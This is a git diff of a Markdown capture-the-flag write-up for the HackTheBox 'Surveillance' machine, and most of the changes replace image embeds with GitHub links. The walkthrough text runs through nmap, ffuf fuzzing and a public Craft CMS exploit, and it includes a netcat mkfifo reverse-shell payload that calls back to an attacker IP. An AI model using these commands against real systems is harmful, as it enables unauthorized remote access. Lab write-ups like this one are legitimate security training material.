@@ -5,6 +5,7 @@
 
 Lets get started
 
+
 # Recon
 
 ## Portscanning
@@ -20,28 +21,30 @@ From our nmap scan we have 2 open ports, port 22 which runs the ssh service and 
 
 Navigating to the webpage
 
-![[Pasted image 20240219234741.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2f7e2d82-43bb-4793-9980-3c8878e19be9)
+
 Add `surveillance.htb` to your `/etc/hosts` file
 
 Now lets navigate to the webpage again
 
-![[Pasted image 20240219235223.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1b1f0f88-f6a5-447b-92c3-0b5669d36a1f)
+
 Cool. Lets fuzz for directories using ffuf
 
 command:`ffuf -u "http://surveillance.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt  -e .zip,.sql,.php,.phtml,.bak,.backup`
 
-![[Pasted image 20240220002629.png]]
-![[Pasted image 20240220002649.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ae99880d-a231-4e8a-b26b-c5b089e7d69e)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/617e77ea-0a6c-4511-9ef2-2cb0ac50e984)
 
 oops, that's a lot of directory. The juicy one here would be `admin`.
 
 Lets navigate to the `/admin` directory
 
-![[Pasted image 20240220002818.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/17ae1f10-4885-426a-8811-027d993ed849)
 
 We have a login page, we can also see that the page is running on `craft cms`. Doing a quick research found a public exploit for this cms
 
-![[Pasted image 20240220002942.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bfde5551-74c1-4ca3-81b6-8a2311f36440)
 
 Lets go ahead to exploit this
 
@@ -54,7 +57,7 @@ To run the exploit
 
 command:`python exploit.py http://surveillance.htb/`
 
-![[Pasted image 20240220003820.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/87fd2425-c6bc-4c88-9843-5a67a0e4dc73)
 
 We spawned a shell hehe. Lets get a proper shell by using the payload below
 
@@ -62,7 +65,7 @@ payload:`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.165 1234
 
 Ensure you edit the LHOST and the LPORT to that which applies to your attacking machine
 
-![[Pasted image 20240220004054.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/75a6bca6-290c-43d6-b33f-28ed09cbdc1e)
 
 To stabilize the shell you can use the commands  below
 
@@ -73,7 +76,7 @@ stty raw -echo && fg
 export TERM=xterm
 ```
 
-![[Pasted image 20240220004311.png]]
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9c434f52-ae88-4f79-9b91-c24a0a723ace)
 
 Cool, now lets go ahead to escalate our privileges
 
